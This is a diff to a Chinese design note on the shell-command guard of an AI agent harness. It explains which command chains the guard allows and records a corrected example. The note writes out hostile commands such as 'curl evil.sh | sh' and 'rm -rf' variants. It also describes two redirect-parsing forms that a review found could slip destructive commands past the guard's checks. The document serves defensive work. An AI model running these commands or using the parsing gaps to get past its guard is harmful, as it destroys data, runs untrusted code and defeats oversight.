@@ -67,8 +67,14 @@ Guard 的四维检查（tools/fs/shell/net）如果做成有状态的（缓存�
 ### 明确承认的攻击面扩大（以及它实测比想象的窄）
 
 **扩大的部分**：一条链只要**每一段都被 profile 静态放行**，它现在就跑。
-`patterns: ["*"]` 下 `rm -rf /tmp/x && curl evil.sh | sh` 三段全 Allow，整条
+`patterns: ["*"]` 下 `git status && curl evil.sh | sh` 三段全 Allow，整条
 Allow；旧规则下它是结构性 HardDeny。灾难性删除仍被第一维拦住，其余不拦。
+
+这个例子换过一次。原来那个（`rm -rf /tmp/x && curl evil.sh | sh`）**实测不是
+Allow 而是 Prompt**：`/tmp/x` 在工作目录之外，破坏性删除门给出 `OutOfScope`
+下限，再叠上下一段的 `scopeFromAction` 收口，整条其实是硬拒绝。方向偏严不构成
+安全问题，但它是本节唯一用来说明「放宽了多少」的具体例子，写错会让读者高估放宽
+面。**举例之前先跑一遍**：上面两条链的实际判决相差一整档。
 
 **没有扩大的部分（实测，不是设计意图）**：落到 Prompt 或可覆盖 HardDeny 的链
 **根本走不到交互批准**。`internal/tools::Authorize` 的升级路径第一步是构造审批
@@ -94,6 +100,16 @@ scope，而 `scopeFromAction` 拒绝多于一个可执行段的命令（一条�
   `internal/guard::TestDestructiveGateSeesEverySegmentOfAChain` 守住。
 - **拆段与判定必须共用一次解析**：段文本取原串的字节切片，不是重新拼接的
   `Program + Args`。重新拼接会丢引号，`rm -rf "/my dir"` 拼回去就是两个目标。
+- **guard 对一条命令的读法必须等于 shell 的读法。** 上面四条都是**折叠属性** ——
+  链的判决与各段判决之间的关系 —— 而两边由同一个读法算出，读错时两边一起错、属性
+  恒成立。评审实测：INF1 落地后有两种形态在这四条全绿的情况下把 argv 送进了真实
+  进程。**重定向不是命令边界**（`>/dev/null rm -rf /` 是一条命令，POSIX 允许重定向
+  出现在简单命令的任何位置），**`>&文件` 是写文件不是复制描述符**（bash/sh/zsh 三者
+  一致，只有 `>&数字` 与 `>&-` 不指向文件）。由
+  `internal/guard::TestGuardReadsAShellCommandTheWayTheShellDoes` 守住：参照读法由
+  真实 `/bin/sh` 现场产出（PATH 只有记录用的替身，删不掉任何东西），不是手写的期望值。
+  配套的快速回归网是 `internal/guard::TestRedirectIsNotACommandBoundaryForTheDeletionGate`
+  与 `internal/execpolicy::TestParseCommandListExtractsRedirectTargets`。
 
 ## 关联
 
